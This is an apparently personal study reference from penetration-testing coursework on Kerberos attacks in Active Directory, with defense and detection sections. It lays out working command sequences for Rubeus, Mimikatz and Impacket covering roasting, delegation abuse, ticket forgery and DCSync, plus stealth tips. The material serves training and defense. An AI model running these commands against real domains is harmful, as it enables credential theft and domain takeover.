# Kerberos Attack Chains - Comprehensive Reference

**HTB Academy CPTS | Sanitized for Public Documentation**

> **Note:** All usernames, passwords, hashes, IP addresses, and domain names have been sanitized for security.

---

## Table of Contents

1. [Kerberos Protocol Overview](#1-kerberos-protocol-overview)
2. [AS-REP Roasting](#2-as-rep-roasting)
3. [Kerberoasting](#3-kerberoasting)
4. [Unconstrained Delegation](#4-unconstrained-delegation)
5. [Constrained Delegation](#5-constrained-delegation)
6. [Resource-Based Constrained Delegation (RBCD)](#6-resource-based-constrained-delegation-rbcd)
7. [Pass-the-Ticket (PTT)](#7-pass-the-ticket-ptt)
8. [Overpass-the-Hash](#8-overpass-the-hash)
9. [Golden Ticket](#9-golden-ticket)
10. [Silver Ticket](#10-silver-ticket)
11. [S4U2Self & S4U2Proxy](#11-s4u2self--s4u2proxy)
12. [DCSync](#12-dcsync)
13. [Tool Reference](#13-tool-reference)
14. [Detection & Defense](#14-detection--defense)

---

## 1. Kerberos Protocol Overview

### Core Concepts

Kerberos is a network authentication protocol using symmetric key cryptography and a trusted third party (KDC - Key Distribution Center). Authentication uses tickets rather than passwords over the network.

### Three-Phase Authentication Flow

1. **AS-REQ/AS-REP:** Client requests TGT from KDC using user credentials
2. **TGS-REQ/TGS-REP:** Client presents TGT to request service ticket (TGS)
3. **AP-REQ:** Client presents service ticket to access resource

### Key Components

- **KDC (Key Distribution Center):** Issues tickets, runs on Domain Controller
- **TGT (Ticket Granting Ticket):** Encrypted with krbtgt hash, proves user authentication
- **TGS (Ticket Granting Service):** Service ticket encrypted with service account hash
- **SPN (Service Principal Name):** Identifies services in format SERVICE/hostname
- **krbtgt:** Special account whose hash encrypts all TGTs

### Critical Understanding

- **Authentication vs Authorization:** KDC authenticates users, but services authorize access based on ACLs
- **Encryption Keys:** User hash encrypts AS-REP, krbtgt hash encrypts TGT, service hash encrypts TGS
- **Offline Attacks:** TGTs and service tickets can be cracked offline if obtained

---

## 2. AS-REP Roasting

### Vulnerability

When accounts have 'Do not require Kerberos preauthentication' enabled, attackers can request AS-REP responses without providing valid credentials. The AS-REP contains encrypted material that can be cracked offline.

### Prerequisites

- Valid username (enumeration required)
- Account with DONT_REQ_PREAUTH flag set
- Network access to DC on port 88

### Attack Flow

**Step 1: Enumerate vulnerable users**

Linux (Impacket):
```bash
# Without credentials (anonymous)
impacket-GetNPUsers -dc-ip <DC_IP> -no-pass -usersfile users.txt DOMAIN/

# With domain credentials
impacket-GetNPUsers -dc-ip <DC_IP> DOMAIN/user:password
```

Windows (Rubeus):
```cmd
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

**Step 2: Crack obtained hashes**
```bash
hashcat -m 18200 hashes.txt wordlist.txt
```

### Defense

- Ensure preauthentication is required for all accounts
- Enforce strong password policies
- Monitor for AS-REQ without preauthentication data

---

## 3. Kerberoasting

### Vulnerability

Any authenticated domain user can request service tickets (TGS) for any SPN. These tickets are encrypted with the service account's hash and can be cracked offline to recover passwords.

### Prerequisites

- Valid domain credentials
- Service accounts with registered SPNs
- Network access to DC

### Attack Flow

**Step 1: Enumerate SPNs**

Linux (Impacket):
```bash
impacket-GetUserSPNs -dc-ip <DC_IP> DOMAIN/user:password
```

Windows (PowerView):
```powershell
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname
```

**Step 2: Request service tickets**

Linux:
```bash
impacket-GetUserSPNs -dc-ip <DC_IP> -request DOMAIN/user:password
```

Windows (Rubeus):
```cmd
.\Rubeus.exe kerberoast /outfile:hashes.txt
```

**Step 3: Crack service account hashes**
```bash
hashcat -m 13100 hashes.txt wordlist.txt
```

### Defense

- Use Managed Service Accounts (MSA/gMSA) with auto-rotating passwords
- Enforce 25+ character passwords for service accounts
- Monitor for TGS-REQ spikes from single users
- Implement least privilege for service accounts

---

## 4. Unconstrained Delegation

### Vulnerability

Computers/users with unconstrained delegation can impersonate any user to any service. When a user authenticates, their TGT is cached on the delegated machine and can be extracted.

### Prerequisites

- Computer/user with TRUSTED_FOR_DELEGATION flag
- Force or wait for privileged user authentication
- Local admin on delegated machine

### Attack Flow

**Step 1: Enumerate unconstrained delegation**

Windows (PowerView):
```powershell
Get-DomainComputer -Unconstrained | Select name,dnshostname
```

Linux (ldapsearch):
```bash
ldapsearch -H ldap://<DC_HOST> -D 'user@domain.com' -w 'password' \
  -b 'DC=domain,DC=com' \
  '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
```

**Step 2: Force authentication (coercion)**
```cmd
# SpoolSample - printer bug coercion
.\SpoolSample.exe <TARGET_DC> <DELEGATED_SERVER>
```

**Step 3: Monitor for TGTs (on delegated machine)**
```cmd
.\Rubeus.exe monitor /interval:5 /filteruser:<TARGET_DC>$
```

**Step 4: Extract and use TGT**
```cmd
.\Rubeus.exe ptt /ticket:[base64ticket]

# Then perform DCSync or access resources
.\mimikatz.exe "lsadump::dcsync /user:domain\Administrator" exit
```

### Defense

- Minimize unconstrained delegation usage
- Use constrained delegation instead
- Enable Protected Users group for privileged accounts
- Monitor for printer spooler coercion

---

## 5. Constrained Delegation

### Vulnerability

Constrained delegation limits which services a user/computer can impersonate others to. With protocol transition, can impersonate any user without their password. Uses S4U2Self and S4U2Proxy extensions.

### Prerequisites

- Account with msDS-AllowedToDelegateTo attribute set
- TRUSTED_TO_AUTH_FOR_DELEGATION flag (for protocol transition)
- Credentials or hash of delegated account

### Attack Flow - Windows

**Step 1: Enumerate constrained delegation**
```powershell
Get-DomainUser -TrustedToAuth | Select name,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select name,msds-allowedtodelegateto
```

**Step 2: Request TGT for delegated account**
```cmd
.\Rubeus.exe asktgt /user:serviceaccount /rc4:<NTLM_HASH> \
  /domain:domain.com /dc:<DC_HOST>
```

**Step 3: Request service ticket (S4U)**
```cmd
.\Rubeus.exe s4u /impersonateuser:Administrator \
  /msdsspn:cifs/<TARGET_HOST> /ticket:[base64] /ptt
```

**Step 4: Access target service**
```cmd
dir \\<TARGET_HOST>\c$
```

### Attack Flow - Linux

**Step 1: Enumerate**
```bash
impacket-findDelegation -dc-ip <DC_IP> domain.com/user:password
```

**Step 2: Request impersonation ticket**
```bash
impacket-getST -spn cifs/<TARGET_HOST> -impersonate Administrator \
  -dc-ip <DC_IP> domain.com/serviceaccount:password
```

**Step 3: Use ticket**
```bash
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <TARGET_HOST>
```

### Alternate Service Name Abuse

When targeting computer accounts, services share encryption keys. Can request CIFS ticket but use for LDAP, HTTP, etc:

```cmd
.\Rubeus.exe s4u /impersonateuser:Administrator \
  /msdsspn:cifs/<TARGET_HOST> /altservice:ldap /ptt
```

### Defense

- Limit accounts with delegation rights
- Disable protocol transition when possible
- Use Protected Users group
- Monitor for S4U2Self/S4U2Proxy requests

---

## 6. Resource-Based Constrained Delegation (RBCD)

### Vulnerability

RBCD reverses delegation trust - the target resource specifies who can delegate to it via msDS-AllowedToActOnBehalfOfOtherIdentity. Attackers with GenericWrite/GenericAll can configure RBCD and impersonate users.

### Prerequisites

- GenericWrite/GenericAll/WriteProperty on target computer
- Control of account with SPN (or ability to create one)
- MachineAccountQuota > 0 OR existing controlled account

### Attack Flow - Windows

**Step 1: Enumerate writable computers**
```powershell
Find-InterestingDomainAcl | ?{$_.identityreferencename -match 'user'} | \
  Select objectdn,activedirectoryrights
```

**Step 2: Create computer account (if needed)**
```powershell
# Using PowerMad
New-MachineAccount -MachineAccount FAKECOMP$ \
  -Password $(ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force)
```

**Step 3: Configure RBCD on target**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMP$ -Properties objectsid | \
  Select -Expand objectsid
  
$SD = New-Object Security.AccessControl.RawSecurityDescriptor \
  -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
  
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer <TARGET_DC> | Set-DomainObject \
  -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

**Step 4: Perform S4U attack**
```cmd
.\Rubeus.exe s4u /user:FAKECOMP$ /rc4:<NTLM_HASH> \
  /impersonateuser:Administrator /msdsspn:cifs/<TARGET_DC> /ptt
```

### Attack Flow - Linux

**Step 1: Create computer account**
```bash
impacket-addcomputer -computer-name 'FAKECOMP$' -computer-pass 'password' \
  -dc-ip <DC_IP> domain.com/user:password
```

**Step 2: Configure RBCD**
```bash
impacket-rbcd -delegate-from 'FAKECOMP$' -delegate-to '<TARGET_DC>$' \
  -dc-ip <DC_IP> -action write domain.com/user:password
```

**Step 3: Perform S4U attack**
```bash
impacket-getST -spn cifs/<TARGET_DC> -impersonate Administrator \
  -dc-ip <DC_IP> domain.com/FAKECOMP$:password
  
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <TARGET_DC>
```

### Defense

- Reduce MachineAccountQuota to 0
- Monitor msDS-AllowedToActOnBehalfOfOtherIdentity changes
- Restrict GenericWrite/GenericAll permissions
- Protected Users group for privileged accounts

---

## 7. Pass-the-Ticket (PTT)

### Vulnerability

Kerberos tickets (TGT/TGS) can be extracted from memory and reused on other systems. This allows lateral movement without knowing passwords. Tickets cached in LSASS or credential files can be stolen and injected.

### Prerequisites

- Local admin OR SeDebugPrivilege on source machine
- Ticket in memory or credential cache
- Ticket still valid (not expired)

### Attack Flow - Windows

**Step 1: Extract tickets from memory**
```cmd
# Using Rubeus (preferred for OPSEC)
.\Rubeus.exe dump /service:krbtgt

# Using Mimikatz (touches LSASS)
mimikatz.exe "sekurlsa::tickets /export" exit
```

**Step 2: Inject ticket (in new sacrificial process)**
```cmd
.\Rubeus.exe createnetonly /program:cmd.exe
# Note the process ID

.\Rubeus.exe ptt /ticket:[base64] /luid:[LUID_from_createnetonly]
```

**Step 3: Use ticket to access resources**
```cmd
# From the sacrificial process:
dir \\<TARGET_DC>\c$
```

### Attack Flow - Linux

**Step 1: Extract tickets**
```bash
# From keytab file
impacket-ticketer -nthash <NTLM_HASH> -domain-sid <DOMAIN_SID> \
  -domain domain.com Administrator

# From ccache file
cp /tmp/krb5cc_1000 /tmp/ticket.ccache
```

**Step 2: Use ticket**
```bash
export KRB5CCNAME=/tmp/ticket.ccache
impacket-psexec -k -no-pass <TARGET_DC>
```

### OPSEC Considerations

**Sacrificial Processes:**
- Create isolated process for ticket injection
- Prevents contamination of main session
- Easier cleanup after operations
- Kill process to remove all traces

### Defense

- Enable Credential Guard (VBS) to protect LSASS
- Limit privileged account sessions
- Monitor for ticket export/injection events
- Reduce ticket lifetime

---

## 8. Overpass-the-Hash

### Vulnerability

Also called Pass-the-Key, this technique uses NTLM hashes or AES keys to request Kerberos tickets without knowing plaintext passwords. Converts hash-based auth into Kerberos tickets.

### Prerequisites

- NTLM hash or AES key of target account
- Network access to DC

### Attack Flow - Windows

**Using Rubeus:**
```cmd
# With NTLM hash
.\Rubeus.exe asktgt /user:Administrator /rc4:<NTLM_HASH> \
  /domain:domain.com /ptt

# With AES256 key (better OPSEC)
.\Rubeus.exe asktgt /user:Administrator /aes256:<AES_KEY> \
  /domain:domain.com /ptt
```

**Using Mimikatz:**
```cmd
sekurlsa::pth /user:Administrator /domain:domain.com \
  /ntlm:<NTLM_HASH> /run:cmd.exe
```

### Attack Flow - Linux

```bash
impacket-getTGT -hashes :<NTLM_HASH> domain.com/Administrator

export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <TARGET_DC>
```

### Defense

- Same as Pass-the-Hash defenses
- Enable Credential Guard
- Monitor for TGT requests from unusual locations
- Prefer AES encryption over RC4/NTLM

---

## 9. Golden Ticket

### Vulnerability

Golden Tickets are forged TGTs created using the krbtgt account hash. They provide complete domain access and persist even after password resets (until krbtgt is rotated twice).

### Prerequisites

- krbtgt account NTLM hash or AES key
- Domain SID
- Domain name
- Target username to impersonate

### Attack Flow - Windows

**Step 1: Obtain krbtgt hash (requires DA)**
```cmd
# DCSync
.\mimikatz.exe "lsadump::dcsync /user:domain\krbtgt" exit

# From NTDS.dit
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

**Step 2: Get domain SID**
```cmd
whoami /user
# Remove last segment (RID)
```

**Step 3: Create Golden Ticket**
```cmd
# Using Mimikatz
kerberos::golden /user:Administrator /domain:domain.com \
  /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt

# Using Rubeus
.\Rubeus.exe golden /rc4:<KRBTGT_HASH> /user:Administrator \
  /domain:domain.com /sid:<DOMAIN_SID> /ptt
```

**Step 4: Use ticket**
```cmd
dir \\<TARGET_DC>\c$
impacket-psexec -k domain.com/Administrator@<TARGET_DC>
```

### Attack Flow - Linux

```bash
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> \
  -domain domain.com Administrator
  
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <TARGET_DC>
```

### Advanced Options

- Set custom lifetime: `/endin:YYYY-MM-DD /renewmax:YYYY-MM-DD`
- Add to privileged groups: `/groups:512,513,518,519,520`
- Create for any user (real or fake)
- Use AES keys instead of NTLM for better stealth

### Defense

- Rotate krbtgt password twice (wait 10 hours between)
- Monitor for TGT requests with unusual lifetimes
- Enable PAC validation
- Use separate krbtgt for RODCs

---

## 10. Silver Ticket

### Vulnerability

Silver Tickets are forged service tickets (TGS) created using service account hashes. They provide access to specific services without contacting the DC, making them stealthier than Golden Tickets.

### Prerequisites

- Service account NTLM hash or AES key
- Domain SID
- Service SPN
- Target service hostname

### Attack Flow - Windows

**Step 1: Obtain service account hash**
```cmd
# For computer accounts (easier - just need local admin)
.\mimikatz.exe "lsadump::secrets" exit

# For service accounts (need DA for DCSync)
.\mimikatz.exe "lsadump::dcsync /user:serviceaccount" exit
```

**Step 2: Create Silver Ticket**
```cmd
# Using Mimikatz
kerberos::golden /user:Administrator /domain:domain.com \
  /sid:<DOMAIN_SID> /target:<TARGET_HOST> /service:MSSQLSvc \
  /rc4:<SERVICE_HASH> /ptt

# Using Rubeus
.\Rubeus.exe silver /service:MSSQLSvc/<TARGET_HOST> \
  /rc4:<SERVICE_HASH> /user:Administrator \
  /domain:domain.com /sid:<DOMAIN_SID> /ptt
```

**Step 3: Access service**
```cmd
# For CIFS
dir \\<TARGET_HOST>\c$

# For SQL
sqlcmd -S <TARGET_HOST>
```

### Attack Flow - Linux

```bash
impacket-ticketer -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> \
  -domain domain.com -spn cifs/<TARGET_HOST> Administrator
  
export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass <TARGET_HOST>
```

### Common Service SPNs

- **CIFS** - File sharing access
- **HTTP** - Web services, WinRM
- **MSSQLSvc** - SQL Server access
- **LDAP** - Directory access, DCSync capability
- **HOST** - Multiple services, general access

### Defense

- Enable PAC validation on services
- Monitor service account password changes
- Use gMSA with automatic password rotation
- Limit local admin access to prevent hash extraction

---

## 11. S4U2Self & S4U2Proxy

### Overview

Service-for-User (S4U) extensions allow services to obtain tickets on behalf of users. S4U2Self gets a service ticket to itself for any user. S4U2Proxy uses that ticket to get tickets to other services.

### S4U2Self

**Purpose:** Obtain service ticket to self on behalf of any user

**Used by:** Services that authenticate users via non-Kerberos means (forms auth, certificates)

**Result:** Forwardable service ticket (if protocol transition enabled)

### S4U2Proxy

**Purpose:** Use service ticket to obtain tickets for other services

**Requires:** msDS-AllowedToDelegateTo configured on account

**Result:** Service ticket to backend services

### Attack Pattern

**Combined S4U2Self + S4U2Proxy = Constrained Delegation Attack**

**Step 1: Request TGT for service account**
```cmd
.\Rubeus.exe asktgt /user:service /rc4:<NTLM_HASH> /domain:domain.com
```

**Step 2: S4U2Self - Get ticket for target user**
```cmd
.\Rubeus.exe s4u /ticket:[TGT] /impersonateuser:Administrator /self
```

**Step 3: S4U2Proxy - Get ticket to backend service**
```cmd
.\Rubeus.exe s4u /ticket:[TGT] /impersonateuser:Administrator \
  /msdsspn:cifs/<TARGET_DC> /ptt
```

### Limitations

- S4U2Self tickets are service tickets, not TGTs
- Cannot perform double-hop authentication
- File access works, but not network traversal to other systems
- Use DCSync or other techniques for full domain compromise

---

## 12. DCSync

### Vulnerability

DCSync abuses domain controller replication to extract password hashes from Active Directory. Any account with 'Replicating Directory Changes' permissions can request password data.

### Prerequisites

- Account with DS-Replication-Get-Changes permissions
- Typically requires Domain Admin or equivalent
- Network access to DC

### Attack Flow - Windows

```cmd
# Extract specific user
.\mimikatz.exe "lsadump::dcsync /user:domain\Administrator" exit

# Extract krbtgt for Golden Ticket
.\mimikatz.exe "lsadump::dcsync /user:domain\krbtgt" exit

# Extract all domain hashes
.\mimikatz.exe "lsadump::dcsync /all /csv" exit
```

### Attack Flow - Linux

```bash
# Using credentials
impacket-secretsdump -just-dc domain.com/Administrator:password@<TARGET_DC>

# Using hash
impacket-secretsdump -hashes :<NTLM_HASH> -just-dc \
  domain.com/Administrator@<TARGET_DC>

# Using Kerberos ticket
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass <TARGET_DC>
```

### Alternative: Direct NTDS.dit Access

If you have SYSTEM access on DC:

```cmd
# Extract NTDS.dit and SYSTEM hive
reg save HKLM\SYSTEM system.hive
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q

# Extract hashes offline
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
```

### Defense

- Limit accounts with replication rights
- Monitor for DCSync attempts (Event ID 4662)
- Enable Advanced Audit Policy
- Use Protected Users group for admins

---

## 13. Tool Reference

### Windows Tools

**Rubeus** - Primary Kerberos tool
- `asreproast` - AS-REP roasting
- `kerberoast` - Kerberoasting
- `asktgt` - Request TGT
- `asktgs` - Request service ticket
- `s4u` - S4U2Self/S4U2Proxy attacks
- `golden` - Create Golden Ticket
- `silver` - Create Silver Ticket
- `dump` - Extract tickets from memory
- `ptt` - Pass-the-ticket
- `monitor` - Monitor for new tickets
- `createnetonly` - Create sacrificial process

**Mimikatz**
- `sekurlsa::tickets` - Extract tickets from LSASS
- `kerberos::golden` - Create Golden/Silver tickets
- `kerberos::ptt` - Pass-the-ticket
- `lsadump::dcsync` - DCSync attack
- `sekurlsa::pth` - Overpass-the-hash

**PowerView**
- `Get-DomainUser -SPN` - Find Kerberoastable users
- `Get-DomainComputer -Unconstrained` - Find unconstrained delegation
- `Get-DomainUser -TrustedToAuth` - Find constrained delegation
- `Find-InterestingDomainAcl` - Find writable ACLs for RBCD

**PowerMad**
- `New-MachineAccount` - Create computer account for RBCD

### Linux Tools

**Impacket Suite**
- `GetNPUsers.py` - AS-REP roasting
- `GetUserSPNs.py` - Kerberoasting
- `getTGT.py` - Request TGT (Overpass-the-hash)
- `getST.py` - S4U attacks, request service tickets
- `ticketer.py` - Create Golden/Silver tickets
- `secretsdump.py` - DCSync, extract hashes
- `psexec.py` - Execute with Kerberos tickets
- `smbexec.py` - Alternative execution
- `wmiexec.py` - WMI-based execution
- `findDelegation.py` - Find delegation
- `addcomputer.py` - Add computer account
- `rbcd.py` - Configure RBCD

**Other Tools**
- `kerbrute` - Username enumeration and password spraying
- `crackmapexec` - Swiss army knife for AD attacks
- `hashcat` - Crack obtained hashes

---

## 14. Detection & Defense

### Monitoring & Detection

**Event IDs to Monitor:**
- **4768** - TGT request (monitor for failures, unusual times)
- **4769** - Service ticket request (monitor for spikes)
- **4770** - Service ticket renewal
- **4771** - Kerberos pre-auth failure
- **4624** - Logon success with type 3 (network)
- **4662** - Object access (DCSync indicator)
- **4738** - User account modified (for RBCD)
- **5136** - Directory object modified (RBCD attribute changes)

### Behavioral Indicators

- Multiple TGS requests in short time (Kerberoasting)
- AS-REP requests without pre-auth data
- Service tickets with unusual encryption types (RC4 for AES-enabled accounts)
- Tickets with abnormal lifetimes
- TGT requests from service accounts
- Replication requests from non-DC computers

### Preventive Controls

**Account Security:**
- Enable Protected Users group for privileged accounts
- Require Kerberos pre-authentication
- Use gMSA for service accounts
- Enforce 25+ character passwords for service accounts
- Disable RC4 encryption, use AES

**Delegation Controls:**
- Minimize unconstrained delegation usage
- Audit delegation configurations regularly
- Set MachineAccountQuota to 0
- Monitor msDS-AllowedToActOnBehalfOfOtherIdentity changes

**System Hardening:**
- Enable Credential Guard (Windows 11 default)
- Implement LAPS for local admin passwords
- Enable PAC validation
- Regularly rotate krbtgt password (twice)
- Limit domain admin logons to DCs only

### Response Actions

**If Kerberoasting detected:**
- Identify targeted service accounts
- Force password reset
- Review account permissions and SPNs

**If Golden Ticket suspected:**
- Rotate krbtgt password twice (10 hour gap)
- Force logoff all users
- Review all privileged account activity
- Look for persistence mechanisms

---

**Sources:**
- HTB Academy CPTS Kerberos Module
- Personal lab testing and documentation
- Recovered from conversation history after VM snapshot failure

**Note:** All credentials, hashes, IP addresses, and domain-specific details have been sanitized for public documentation.
